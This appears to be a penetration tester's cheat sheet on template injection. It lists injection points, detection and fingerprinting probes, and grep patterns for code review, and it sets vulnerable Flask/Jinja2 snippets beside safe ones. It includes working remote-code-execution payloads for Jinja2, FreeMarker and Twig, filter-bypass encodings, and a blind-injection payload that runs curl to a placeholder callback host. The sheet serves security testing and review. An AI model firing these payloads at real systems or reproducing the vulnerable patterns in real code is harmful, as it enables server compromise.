tactics: Initial Access

**Template Injection** is when an attacker injects template syntax (e.g. `{{7*7}}`) into an input that gets processed by a **server-side or client-side template engine** — causing the engine to evaluate attacker-controlled expressions instead of treating them as plain text. If server-side (SSTI), this can lead to **RCE**. If client-side (CSTI), it typically leads to **XSS**.

---

## Injection Points

- URL parameters & query strings → `?name={{7*7}}`
- Form fields (username, search, feedback, etc.)
- HTTP Headers (User-Agent, Referer, X-Forwarded-For)
- File names / upload paths
- JSON/XML body values
- Cookies
- Email or profile fields that get rendered in a template

---

## Checklist

- [ ]  **Detect** — inject a universal polyglot and watch for evaluation:
    - `{{7*7}}` → `49` (Jinja2 / Twig / Pebble)
    - `${7*7}` → `49` (FreeMarker / Thymeleaf / EL)
    - `<%= 7*7 %>` → `49` (ERB / EJS)
    - `#{7*7}` → `49` (Ruby / Spring)
    - `*{7*7}` → `49` (Spring Thymeleaf)
- [ ]  **Fingerprint the engine** — use engine-specific payloads to narrow it down:
    - `{{7*'7'}}` → `7777777` = Jinja2 | `49` = Twig
    - `${"freemarker".toUpperCase()}` = FreeMarker
    - Check error messages — they often leak the engine name and version
- [ ]  **Check reflection** — always inspect the response in DevTools (Elements tab)
    - Copy-paste the raw response to a text file; rendered HTML may hide quotes or tags
- [ ]  **Escalate** — once confirmed, attempt RCE via engine-specific payloads:
    - Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
    - FreeMarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
    - Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- [ ]  **Fuzz blocked chars** — if output is empty or sanitized, bruteforce which chars are stripped:
    - `%{abcdef123456789{}$#@!}`
    - Try URL encoding: `%7B%7B`, double encoding `%257B%257B`
    - Try alternate delimiters if the main ones are blocked
- [ ]  **Context matters** — check if injection lands inside:
    - A string → try to break out with `'`, `"`, backtick
    - An HTML attribute → combine with XSS for CSTI
    - A comment block → `}}-->`
- [ ]  **Blind SSTI** — if no output is reflected, use out-of-band techniques:
    - DNS/HTTP callback: `{{config.__class__.__init__.__globals__['os'].popen('curl YOUR.BURP.COLLAB').read()}}`



## White Box Testing

> You have source code access. Goal: find where user input reaches a template renderer without sanitization.

 **What to grep for**

```bash
# Python (Jinja2 / Mako)
grep -rn "render_template_string\|Template(\|from_string\|jinja2.Environment" .
grep -rn "render(" . | grep -v "#"

# JavaScript (EJS / Pug / Handlebars / Nunjucks)
grep -rn "\.render\|\.compile\|nunjucks\|handlebars\|ejs\.render\|pug\.render" .

# PHP (Twig / Smarty / Blade)
grep -rn "->render\|Twig_Environment\|Smarty\|\$smarty\|->display" .

# Java (FreeMarker / Thymeleaf / Velocity)
grep -rn "Template\.process\|TemplateEngine\|VelocityEngine\|processTemplate" .

# Ruby (ERB / Liquid)
grep -rn "ERB\.new\|\.result\|Liquid::Template\|\.render" .
```

### Dangerous patterns to look for

- [ ]  **Direct string interpolation into template**  the classic sink:


```python
	# VULNERABLE
	template = Template("Hello " + request.args.get("name"))
	
	# SAFE
	template = Template("Hello {{ name }}")
	template.render(name=request.args.get("name"))
```

- [ ]  **`render_template_string` with user input** (Flask/Jinja2):


```python
	# VULNERABLE — user input goes into the template string itself
	render_template_string(f"Hello {username}")
```

- [ ]  **Sandbox disabled or `Environment` with unsafe settings**:


```python
	# Red flag — SandboxedEnvironment not used, or autoescape=False
	env = jinja2.Environment(autoescape=False)
```

- [ ]  **Dynamic template selection from user input**:


```python
	# VULNERABLE — attacker can traverse to arbitrary template files
	template_name = request.args.get("template")
	render_template(template_name)
```

- [ ]  **Eval / exec inside template filters or custom tags** — check custom filter definitions for `eval()` or `exec()` calls.

### Trace the data flow

1. Find all entry points that accept user input (routes, form handlers, API endpoints)
2. Follow the variable through the code to see if it lands in a template renderer **as the template string** (not as a variable passed to a fixed template)
3. Check if any sanitization / escaping happens in between — if not, it's vulnerable

### Config / dependency review

- [ ]  Check `requirements.txt` / `package.json` / `pom.xml` for template engine versions — old versions may lack sandboxing
- [ ]  Check if `SandboxedEnvironment` is used (Jinja2) vs plain `Environment`
- [ ]  Look for `autoescape=False` or globally disabled escaping in framework config
- [ ]  Check custom template tags/filters for unsafe operations

---

## Resources

- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [PortSwigger SSTI Labs](https://portswigger.net/web-security/server-side-template-injection)